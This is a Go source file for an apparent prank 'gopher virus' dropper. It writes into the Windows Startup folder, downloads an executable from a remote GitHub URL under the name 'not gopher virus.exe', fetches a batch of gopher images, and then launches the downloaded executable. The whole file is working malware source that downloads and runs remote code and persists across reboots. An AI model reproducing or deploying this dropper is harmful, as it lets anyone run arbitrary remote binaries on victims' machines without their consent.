// TODO (25,55): better permisions, they don't need to be 777

package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"time"
)

const (
	payloadname = "not gopher virus.exe"
	payloadURL  = "https://raw.githubusercontent.com/UlisseMini/gopher-virus/master/payload.exe"
	listURL     = "https://raw.githubusercontent.com/UlisseMini/gopher-virus/master/list"
	logfile     = "deploy_gophers.log"
)

var (
	logger      *log.Logger
	gopherLinks []string
	client      http.Client
)

func init() {
	// Create logger
	file, err := os.OpenFile(logfile,
		os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	logger = log.New(file, "", 2)

	// Changes directory to shell:startup
	currentUser, err := user.Current()
	must(err)
	err = os.Chdir(currentUser.HomeDir + `\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`)
	must(err)

	// Define gopherLinks as a backup for listURL
	gopherLinks = []string{
		"https://i.imgur.com/ezc39Ti.png",
		"https://i.imgur.com/htPvG4E.png",
		"https://i.imgur.com/sdBbTwg.png",
		"https://i.imgur.com/EgoAEoP.png",
		"https://i.imgur.com/nFKbszb.png",
		"https://i.imgur.com/Gtfbqzh.png",
		"https://i.imgur.com/dCYPvCG.png",
		"https://i.imgur.com/I6vZt11.png",
		"https://i.imgur.com/zaMx3E6.png",
		"https://i.imgur.com/OwuZZ7u.png",
		"https://i.imgur.com/YdAc8Ec.png",
		"https://i.imgur.com/345fyaT.jpg",
		"https://i.imgur.com/Q7S4xfH.png",
		"https://i.imgur.com/3OhpbZO.jpg",
		"https://i.imgur.com/ZnZW4wa.png",
	}
	// create our request client
	client = http.Client{
		Timeout: 10 * time.Second,
	}
}

func main() {
	// downloads payload
	DLAndWrite(payloadURL, payloadname)

	// create gopher folder and cd into it
	err := os.Mkdir("gophers", 777)
	handle(err)
	err = os.Chdir("gophers")
	must(err)

	// download all the gophers
	downloadAll()

	// Execute the payload and exit
	cmd := exec.Command("../" + payloadname)

	// Does not wait for the command to finish so the program ends
	err = cmd.Start()
	handle(err)
}

// downloads ALL gophers and writes them to a file.
func downloadAll() {
	resp, err := client.Get(listURL)
	if err != nil {
		logger.Println("Failed to download gopherlist, using builtin...")
		logger.Printf("%v\n", err)
		DLAndWriteFromList(gopherLinks)
		return
	}

	defer resp.Body.Close()
	b, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		logger.Println("Failed to download gopherlist, using builtin...")
		logger.Printf("%v\n", err)
		DLAndWriteFromList(gopherLinks)
		return
	}
	list := strings.Split(string(b), "\n")
	DLAndWriteFromList(list)
}

func DLAndWriteFromList(list []string) {
	// Download all the links from list
	for index, value := range list {
		// Download and write with a filename equal
		// to index plus the part after the last dot
		dot := strings.LastIndexAny(value, ".")
		switch value[dot:] {
		case ".png", ".jpg", ".jpeg":
			fname := fmt.Sprintf("%d%s", index, value[dot:])
			DLAndWrite(value, fname)
		default:
			logger.Println(value, "is not a valid image url.")
		}
	}
}

// downloads from a URL and writes it to a file
func DLAndWrite(URL string, filename string) {
	// Downloads it
	response, err := client.Get(URL)
	if err != nil {
		logger.Printf("%v\n", err)
		return
	}
	defer response.Body.Close()
	bytes, err := ioutil.ReadAll(response.Body)

	// Now we've downloaded it write it to a file
	err = ioutil.WriteFile(filename, bytes, 777)
	handle(err)
}

// Error handling functions
func handle(err error) {
	if err != nil {
		logger.Printf("%v\n", err)
	}
}

func must(err error) {
	if err != nil {
		logger.Print("[FATAL] ")
		logger.Fatalf("%v\n", err)
	}
}
